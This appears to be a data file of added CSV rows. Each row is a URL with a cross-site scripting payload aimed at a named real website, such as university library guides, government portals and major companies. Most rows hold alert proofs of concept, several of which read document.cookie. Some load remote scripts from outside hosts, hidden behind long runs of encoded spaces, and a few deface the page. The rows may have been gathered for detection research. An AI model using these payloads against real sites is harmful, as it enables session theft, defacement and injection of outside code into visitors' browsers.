+"http://www.arcade-immobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.openmedia.fr/listing.php?ancloca=/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.damely-immobilier.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immobilierhautsdevaugrenier.com/index.php?lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.positifimmobilier.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immobilieredecatalogne.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.events.scientology.org/events/invite.html?id=%3Cimg%20src=%22http://encyclopediadramatica.ch/images/5/5e/Xenu_volcanoes.jpg%22%3E%20%3Cscript%3Ealert(%22Xenu,%20in%20my%20volcanoes?%22)%3C/script%3E",0
+"http://www.1001menus.com/recherche/resultats.html?rdacmh1001=1337"">'><script>alert(document.cookie)</script>",0
+http://www.mtv.com/music/artists/browse.jhtml?chars=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E,0
+http://www.sephora.com/help/storeController.jhtml?country=france&city=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E,0
+http://www.4cornersclub.com/local/image.php?ID=2863&Country=128%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://tomchalk.com/image.php?id=27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.simkom.com/sketchsite/image.php?id=126650775024196%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+"http://natolibguides.info/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://infoguides.gmu.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://libguides.sbuniv.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.cabq.gov/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.metro.org/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.lib.washington.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.bc.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.lib.uchicago.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.lib.uiowa.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://researchguides.library.wisc.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://guides.library.duke.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.hcl.harvard.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://subjectguides.library.american.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.uwlax.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://libguides.sit.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://libguides.princeton.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://legalresearch.usfca.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.hcc.hawaii.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://researchguides.case.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.lib.virginia.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.library.manoa.hawaii.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.mit.edu/searchtags.php?iid=148&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://guides.slsa.sa.gov.au/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://libguides.olympic.edu/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+http://www.munyie.com/search.php?keywords=%3Cscript%3Ealert%28%22XSSED%20By%20./r14nul%22%29%3C/script%3E,0
+"http://www.wiktik.com/emploi/internet-web/offres-1.html?competence=23&keywords=/""><script>alert('XssBy Atm0n3r')</script>",0
+http://www.lgjobs.com/searches/reo6twv66vmre?kw=%22-%3E%3Cscript%3Ealert%28%2Fxssed%2F%29%3C%2Fscript%3E&order=desc&sort=score,0
+"http://www.hotel-pension-theresia.at/guestbook/admin/guestbook.admin.php?action=settings&guestbook_id=0&language=english&gmt_ofs=0http://www.haus-unterberg.at/admin/gaestebuch/admin/guestbook.admin.php?action=settings&guestbook_id=0&language=german&gmt_ofs=0%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+http://spf.com/es/tienda/productos/all-star-core-hi-7610165?color=%22%27%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--%3Cscript%3E,0
+"http://www.seoghoer.dk/layouts/SeOgHoer/sewebtvqbrick.aspx?vid=""><script>alert(document.cookie);</script>",0
+http://www.bulutangkis.com/mod.php?mod=publisher&op=search&query=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://pastebin.com/d/medo.ir,0
+"http://www.besac.com/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.montbeliard-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.dole-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+http://disparbud.jabarprov.go.id/wisata/search.php?cari=%3C%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&lang=id,0
+http://www.domain.com/vps/upsell.php?vpsproduct=%3C%22%3C%3CsCrIpT%3Ealert%281%29%3C/sCrIpT%3E%3C%22%3C%3CsCrIpT%3Ealert%281%29%3C/sCrIpT%3E,0
+"http://www.avgbulgaria.com/contact?product=%22%3E%3C/scRipT%3E%3CscRipT%3Eeval(String.fromCharCode(99,111,110,102,105,114,109,40,34,88,83,83,45,66,71,34,41,59));%3C/scRipT%3E",0
+http://enable.ftd.de/wp-content/themes/enable/popup.php?url=http://data.xssed.org/images/xssed_logo.gif,0
+http://medienkunstpreis.zkm.de/archiv/archiv.php?language=%22onmouseover=alert%28document.cookie%29%20%22,0
+http://www.ddjs-drome.jeunesse-sports.gouv.fr/index.php?act=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.nep.uscourts.gov/judArch/showImage.php?img=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://dnserro.brasiltelecom.com.br/main.php?file=www.developers.facebook.com/policy%22%3E%3Cimg%20src=x%20onerror=alert%28/XSSED/.source%29%3E,0
+http://www.ffsc.fr/recherche.php?motscles=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.eneriance.fr/actualites.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.industrie.gov.tn/marquage-ce/www/fr/recherche.asp?cles=%3CBODY%20ONLOAD=alert%28%22By-Hedi-Mlika%22%29%3E%3CIMG%20SRC=%22http://chronic-dev.org/files/pwned.jpg%22%3E,0
+http://paris-locations-saisonnieres.fr/detail.php?id=%3Cscript%3Ealert%28%22Virtual_SystEm%22%29%3C/script%3E.,0
+http://www.imgovi.com/fr/detail.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.verisign.co.uk/authweb/global/includes/shared/playvideo_bc.php?mid=1301619962001&w=720&h=406&mh=Cross-Site%20Scripting%20%3Ca%20href=http://twitter.com/matiaslonigro%3E@matiaslonigro%3C/a%3E&mt=2:57&md=%3CscRipt%3Ealert%28/XSS:%20Cross-Site%20Scripting%20vulnerability/%29%3C/SCript%3E,0
+http://www.surf-kite.fr/detail.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.un.org.ec/pages/interna_noticias.php?txtCodiNoti=71%22%3E%3Ciframe%20onload=alert%280x0c12%29%3E,0
+http://appworld.blackberry.com/webstore/nocache/login/loginredirect.seam?i=http://www.bing.com,0
+https://www.americanexpress.com/taiwan/Personal/cards/offers/index.cgi?taiwan_nav=%22'--%3E%3Ciframe%20src=%22http://xssed.com%22%3E%3C!--,0
+http://www.logementsocialdurable.fr/formation.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.forzi.fr/detail.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.paris-vacation-apartments.fr/?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://hopla.fr/detail.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+"http://archives.hwg.org/hwg-techniques/a04330101b79f77082960@%5B203.173.203.78%5D""><script>alert(""XSS DETECTED XCode Exploit Scanner"")</script>",0
+http://traffic.511.org/traffic_text_incident_detail.asp?id=2012011021102401002%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://www.ajax-zoom.com/demo/magento/index.php/review/product/list/id/138/category/32/%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://www.backscatter.com/learn/article/article.php?ID=66%22%3E%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://www.codango.com/asp/fnc/new/?pg=2&amp;order=desc%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://www.pchardware.ro/Articles/article.php?id=127%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://cac.ca.gov/mobile/festivalsmonth.php?month=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.tiesto.com/include/news/news_Index_Ajax.php?_=1328995186142&month=%22%3E%3Ciframe%20onload=alert%28document.cookie%29%3E&year=2012,0
+"http://mexico.cnn.com/cmx2_buscar.php?q=xss&sort=fecha&user_input=HERE%20HAVE%20A%20%20XSS%22onFocus=confirm(document.cookie);alert(navigator.userAgent);document.write(String.fromCharCode(114,101,100,100,105,116,46,99,111,109,47,114,47,120,115,115,47));eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,97,115,115,105,103,110,40,34,104,116,116,112,58,47,47,119,119,119,46,114,101,100,100,105,116,46,99,111,109,47,114,47,120,115,115,47,34,41)); autofocus%20bad=%22",0
+"http://www.nationalarchives.gov.uk/nra/searches/subjectView.asp?ID=O39078"">          <SCRIPTSRC=http://lupbot.comule.com/aSU_aBANGjs.php></SCRIPT>",0
+http://wabcradio.com/sectional.asp?id=33447%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://web4.lan.511.org/traffic_text_incident_detail.asp?id=2012021223315001002%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://www.fantue.com/forum-inurl-article-php-id-1-and-1-2-and%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+"http://www.insidefutures.com/articles/article.php?id=285337utmterm=futurescommoditiescommentaryutmcontent=Relevantfuturesprices,charts,andtradingcommentaryauthoredbykeyplayersinthecommodities,forexandoptionsindustriesutmsource=twi%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E",0
+http://www.musiquemachine.com/articles/articles_template.php?id=132%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+"http://www.on-veut-du-cul.com/cul.php?type=phrase+exacte&search=""><script>alert('Xss ByAtm0n3r')</script>&categorie=partout&rechercher.x=26&rechercher.y=6",0
+http://www.nic.mw/index.php?contact_type=1&domain=%22%3E%3Ciframe%20onload=alert%28/XSS/%29%3E&e_mail=sample@email.tst&link=forgot&o2p=Submit,0
+"http://www.lons-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+http://duniaflora.com/mod.php?mod=iklanbaris&op=search&query=http://www.bulutangkis.com/mod.php?mod=publisher&op=search&query=%22%3E%3C%2FscRipT%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%3Cscript%3Edocument.body.innerHTML%3D%22%3Cstyle%3Ebody{visibility%3Ahidden%3B+background%3Ablack%3B}%3C%2Fstyle%3E%3Cdiv+style%3Dvisibility%3Avisible%3B%3E%3Ccenter%3E%3Ch1%3E%3Cfont+color%3D%27white%27%3EXSS+Test+By+%3C%2Ffont%3E%3Cfont+color%3D%27red%27%3EEmily.Josan%3C%2Ffont%3E%3Cfont+color%3D%27white%27%3E!%3C%2Ffont%3E%3C%2Fh1%3E%3Cfont+color%3D%27white%27%3E%402012%3Ch1%3E%3Cfont+color%3D%27333333%27%3E+example+for+xss%3C%2Ffont%3E%3C%2Fh1%3E%3Cbr%3E%22%3B%3C%2Fscript%3E,0
+http://www.larismanis.web.id/mod.php?mod=iklanbaris&op=search&query=%22%3E%3C%2FscRipT%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%3Cscript%3Edocument.body.innerHTML%3D%22%3Cstyle%3Ebody{visibility%3Ahidden%3B+background%3Ablack%3B}%3C%2Fstyle%3E%3Cdiv+style%3Dvisibility%3Avisible%3B%3E%3Ccenter%3E%3Ch1%3E%3Cfont+color%3D%27white%27%3EXSS+Test+By+%3C%2Ffont%3E%3Cfont+color%3D%27red%27%3EEmily.Josan%3C%2Ffont%3E%3Cfont+color%3D%27white%27%3E!%3C%2Ffont%3E%3C%2Fh1%3E%3Cfont+color%3D%27white%27%3E%402012%3Ch1%3E%3Cfont+color%3D%27333333%27%3E+example+for+xss%3C%2Ffont%3E%3C%2Fh1%3E%3Cbr%3E%22%3B%3C%2Fscript%3E,0
+"http://www.pontarlier-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.gray-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.luxeuil-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.vesoul-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.fczoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://www.champagnole-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+http://en.taiyanglong.com/error.asp?msg=Or: <script>alert(document.cookie)</script>,0
+http://pegchem.com/eng/error.asp?msg=<script>alert(document.cookie)</script>,0
+http://www.verisign.de/authweb/global/includes/shared/playvideo_bc.php?mid=1301619962001&w=720&h=406&mh=Cross-Site%20Scripting%20%3Ca%20href=http://twitter.com/matiaslonigro%3E@matiaslonigro%3C/a%3E&mt=2:57&md=%3CscRipt%3Ealert%28/XSS:%20Cross-Site%20Scripting%20vulnerability/%29%3C/SCript%3E,0
+http://www.echannelline.com/usa/story.cfm?item=23100%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+http://www.verisign.com/authweb/global/includes/shared/playvideo_bc.php?mid=1301619962001&w=720&h=406&mh=Cross-Site%20Scripting%20%3Ca%20href=http://twitter.com/matiaslonigro%3E@matiaslonigro%3C/a%3E&mt=2:57&md=%3CscRipt%3Ealert%28/XSS:%20Cross-Site%20Scripting%20vulnerability/%29%3C/SCript%3E,0
+https://www.americanexpress.com/finland/personal/cards/rewards/search_details.cgi?rewardcode=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--,0
+http://www.verisign.fr/authweb/global/includes/shared/playvideo_bc.php?mid=1301619962001&w=720&h=406&mh=Cross-Site%20Scripting%20%3Ca%20href=http://twitter.com/matiaslonigro%3E@matiaslonigro%3C/a%3E&mt=2:57&md=%3CscRipt%3Ealert%28/XSS:%20Cross-Site%20Scripting%20vulnerability/%29%3C/SCript%3E,0
+http://www.verisign.ch/authweb/global/includes/shared/playvideo_bc.php?mid=1301619962001&w=720&h=406&mh=Cross-Site%20Scripting%20%3Ca%20href=http://twitter.com/matiaslonigro%3E@matiaslonigro%3C/a%3E&mt=2:57&md=%3CscRipt%3Ealert%28/XSS:%20Cross-Site%20Scripting%20vulnerability/%29%3C/SCript%3E,0
+http://www.verisign.es/authweb/global/includes/shared/playvideo_bc.php?mid=1301619962001&w=720&h=406&mh=Cross-Site%20Scripting%20%3Ca%20href=http://twitter.com/matiaslonigro%3E@matiaslonigro%3C/a%3E&mt=2:57&md=%3CscRipt%3Ealert%28/XSS:%20Cross-Site%20Scripting%20vulnerability/%29%3C/SCript%3E,0
+"http://www.besancon-zoom.fr/index.php?rech-site=""><script>alert('Xss ByAtm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",0
+"http://movies.apple.com/hk/reseller/reseller.php?name=StudioA&cityid=""EN""><script>alert('cyberbellona.org')</script>",0
+"http://buzzzzz-mania38.info/lavideo.php?id=110/""><script type=""text/javascript""src=""http://yourjavascript.com/27544112151/xss.atmon3r.js""></script>",0
